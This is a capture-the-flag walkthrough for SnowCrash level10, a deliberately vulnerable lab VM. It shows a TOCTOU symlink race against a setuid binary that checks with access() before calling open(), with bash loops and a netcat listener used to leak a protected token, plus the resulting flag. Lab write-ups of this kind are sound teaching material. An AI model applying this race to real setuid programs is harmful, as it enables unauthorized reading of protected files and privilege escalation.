# 1st Step  
List files in level10 user home directory to find `level10` executable and `token` file :  
```
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
level10@SnowCrash:~$
```  
If we look at the executable with strings :  
```
level10@SnowCrash:~$ strings level10
[...]
open
access
[...]
%s file host
        sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file ..
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
[...]
level10@SnowCrash:~$
```  
The executable check if we have the rights to read the file with `access` then try to send it to a server and display its content but we have not the necessary rights on the token file.  
```
level10@SnowCrash:~$ man 2 access
[...]
NOTES
       Warning:  Using  access()  to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking      
       and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the process's effective user  ID  to      
       the real ID and then call open(2).)
[...]
level10@SnowCrash:~$
```
We will use the short time between `access` and `open` to change the file to be opened ([race condition exploit](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use))  

A race condition consists in quickly changing the pointing of a symbolic link between a file of which we have the rights and the file of which we don't have, so that `access` will returns us 'true' while `open` will opens the correct file.  
  
# 2nd Step
We have to open three windows of the virtual machine.  
In the first one, listen on the port 6969 with netcat (remember what we saw with `strings` : "Connecting to %s:6969 ..")  
```
level10@SnowCrash:~$ nc -lk 6969
```
-l to specify netcat should listen on specified port, -k to stay listening after each connection.  
In the second window we create a script that spam the creation of a file, delete it, then create a symbolic link to exploit the short time between these two operations :  
```
level10@SnowCrash:~$ cd /tmp
level10@SnowCrash:/tmp$ vim symlink.sh
level10@SnowCrash:/tmp$ cat symlink.sh
#!/bin/bash

while true; do
        touch /tmp/link
        rm -f /tmp/link
        ln -s /home/user/level10/token /tmp/link
        rm -f /tmp/link
done
level10@SnowCrash:/tmp$
```
First we create a file in `/tmp` in hope that `access` will think that we want to open it.  
Then we delete it before we create a symbolic link so that `open` open the `token` file ! Then we remove our symbolic link before create again because of the infinity loop.  
Don't forget to run it ;)
In the last window, we have to create another infinity loop so that we can execute `~/level10` with the `/tmp/link` file that we created again and again with our precedent script.  
```
level10@SnowCrash:/tmp$ vim spam.sh
level10@SnowCrash:/tmp$ cat spam.sh
#!/bin/bash

while true; do
        /home/user/level10/level10 /tmp/link 192.168.1.30
done
```
Replace `192.168.1.30` by your localhost.  
After few seconds you can stop both scripts and go back to the first window where you will see something like that :  
```
[...]
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
^C
level10@SnowCrash:~$
```  
Let's try it  
```
level10@SnowCrash:~$ su flag10
Password:
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
flag10@SnowCrash:~$ su level11
Password:
level11@SnowCrash:~$
```  
Level10 passed !